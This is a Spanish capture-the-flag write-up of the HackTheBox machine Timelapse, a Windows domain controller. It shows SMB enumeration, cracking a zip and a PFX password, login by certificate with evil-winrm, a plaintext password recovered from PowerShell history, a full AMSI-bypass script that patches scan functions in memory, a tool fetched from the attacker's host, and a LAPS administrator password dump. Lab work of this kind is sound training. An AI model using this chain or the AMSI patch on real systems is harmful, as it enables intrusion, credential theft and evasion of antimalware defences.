---
layout: post
title: Timelapse
date: 2023-07-29
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Timelapse-htb/Timelapse.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.152 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 09:36 GMT
Nmap scan report for 10.10.11.152
Host is up (0.23s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49698/tcp open  unknown
58098/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 53.30 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49675,49676,49698,58098 10.10.11.152 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 09:38 GMT
Nmap scan report for 10.10.11.152
Host is up (0.59s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-29 17:38:10Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2023-07-29T17:39:47+00:00; +7h59m57s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc             Microsoft Windows RPC
49698/tcp open  msrpc             Microsoft Windows RPC
58098/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-29T17:39:10
|_  start_date: N/A
|_clock-skew: mean: 7h59m56s, deviation: 0s, median: 7h59m56s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.90 seconds
```

Añado el dominio ```timelapse.htb``` y el subdominio ```dc01.timelapse.htb``` al ```/etc/hosts```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.11.152
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

Listo los recursos compartidos a nivel de red

```null
smbmap -H 10.10.11.152 -u 'null'
                                                                                                    
[+] IP: 10.10.11.152:445	Name: 10.10.11.152        	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Shares                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

Para ```Shares``` puedo ver dos subdirectorios

```null
smbmap -H 10.10.11.152 -u 'null' -r 'Shares'
                                                                                                    
[+] IP: 10.10.11.152:445	Name: 10.10.11.152        	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Shares                                            	READ ONLY	
	.\Shares\\*
	dr--r--r--                0 Mon Oct 25 15:55:14 2021	.
	dr--r--r--                0 Mon Oct 25 15:55:14 2021	..
	dr--r--r--                0 Mon Oct 25 19:40:06 2021	Dev
	dr--r--r--                0 Mon Oct 25 15:55:14 2021	HelpDesk
```

Encuentro un ```backup```

```null
smbmap -H 10.10.11.152 -u 'null' -r 'Shares/Dev'
                                                                                                    
[+] IP: 10.10.11.152:445	Name: 10.10.11.152        	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Shares                                            	READ ONLY	
	.\Shares\Dev\*
	dr--r--r--                0 Mon Oct 25 19:40:06 2021	.
	dr--r--r--                0 Mon Oct 25 19:40:06 2021	..
	fr--r--r--             2611 Mon Oct 25 21:05:30 2021	winrm_backup.zip
```

Puedo descargarlo

```null
smbmap -H 10.10.11.152 -u 'null' --download 'Shares/Dev/winrm_backup.zip'
[+] Starting download: Shares\Dev\winrm_backup.zip (2611 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Timelapse/10.10.11.152-Shares_Dev_winrm_backup.zip
```

Contiene un certificado

```null
7z l winrm_backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 14:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 14:21:20               2555         2405  1 files
```

Está protegido con contraseña

```null
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

Creo un hash y lo crackeo

```null
zip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-07-29 10:02) 3.571g/s 12405Kp/s 12405Kc/s 12405KC/s surken201..superkaushal2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Del ```PFX``` también se puede extraer una contraseña por fuerza bruta

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:37 DONE (2023-07-29 10:04) 0.02675g/s 86456p/s 86456c/s 86456C/s thuglife03282006..thscndsp1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

En este [artículo](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) explican como extraer un par de claves de este tipo de archivos. Primero extraigo el certificado (Tiene que estar encriptado con una nueva contraseña)

```null
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key.enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Con esa contraseña le hago el decrypt

```null
openssl rsa -in legacyy_dev_auth.key.enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key.enc:
writing RSA key
```

Y obtengo el CRT

```null
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```

Gano acceso al sistema y puedo ver la primera flag

```null
 evil-winrm -i 10.10.11.152 --ssl -c legacyy_dev_auth.crt -k legacyy_dev_auth.key
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> type ..\Desktop\user.txt
8d49445c9b53ff19971821c8928d498d
```

# Escalada

Utilizo ```winpeas.exe``` para enumerar la máquina

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\winpeas.exe
Program 'winpeas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\winpeas.exe
+ ~~~~~~~~~~~~~.
At line:1 char:1
+ .\winpeas.exe
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Pero el AMSI bloquea el binario, a pesar de estar en una ruta del [AppLockerBypass](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md). Utilizo la versión obfuscada de [WinPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/20230724-3e05f4c7/winPEASx64_ofs.exe)

```null
╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

Existe el fichero de histórico de la ```PowerShell```

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Se encuentran credenciales en texto claro. Me conecto como ```svc_deploy```

```null
evil-winrm -i 10.10.11.152 -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

Pertenezco al grupo ```LAPS_Readers```


```null
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/29/2023 8:21:25 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Utilizo un scriptn en PS para bypassear el AMSI

```null
Write-Host "AMSI providers' scan interception"
Write-Host "-- Maor Korkos (@maorkor)"
Write-Host "-- 64bit implemetation"

$Apis = @"
using System;
using System.Runtime.InteropServices;
public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

# Loop through all the providers
while ($AntimalwareProvider -ne 0)
{
  # Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  # Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)

  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}
```

Importo el script [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit). Esto me va a permitir obtener la contraseña del usuario Administrador (Randomizada y dinámica)

```null
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> iwr -uri http://10.10.16.69/LAPSToolkit.ps1 -o LAPSToolkit.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\LAPSToolkit.ps1
```

```null
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSComputers

ComputerName       Password                 Expiration
------------       --------                 ----------
dc01.timelapse.htb %!v{j8vyaq.HT-C0IU#6vkDv 08/02/2023 06:25:13
```

Me conecto como este

```null
 evil-winrm -i 10.10.11.152 -S -u 'Administrator' -p '%!v{j8vyaq.HT-C0IU#6vkDv'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Puedo ver la segunda flag

```null
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
691b89faf188565024aae0d8565c4a11
```